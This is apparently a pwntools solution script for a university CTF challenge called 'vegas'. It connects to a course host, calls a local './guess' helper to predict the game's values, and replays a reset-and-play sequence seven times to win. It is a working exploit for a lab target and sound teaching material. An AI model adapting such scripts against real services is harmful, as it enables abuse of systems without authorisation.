# pwntools is a very powerful library for doing exploitation
from pwn import *
from subprocess import *

# TODO: Update with actual values
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 2773
BINARY = "./vegas"

r = remote(HOST, PORT)  # to open a connection to the remote service, aka the challenge
# r = process(BINARY)   # use process instead of remote to execute the local version of the program
# pause()

NAME = b'0'
RST = b'2'
PLY = b'1'

# TODO: Fill in your payload
r.sendline(NAME)

for i in range(7):
  r.sendline(RST)
  # necessary to get guess before sending NAME due to latency
  guess = check_output(['./guess'])
  r.sendline(NAME)
  r.sendline(PLY)
  r.sendline(guess)


# # earlier, the script helps us send/receive data to/from the service
# # with interactive, we can directly interact with the service
r.interactive()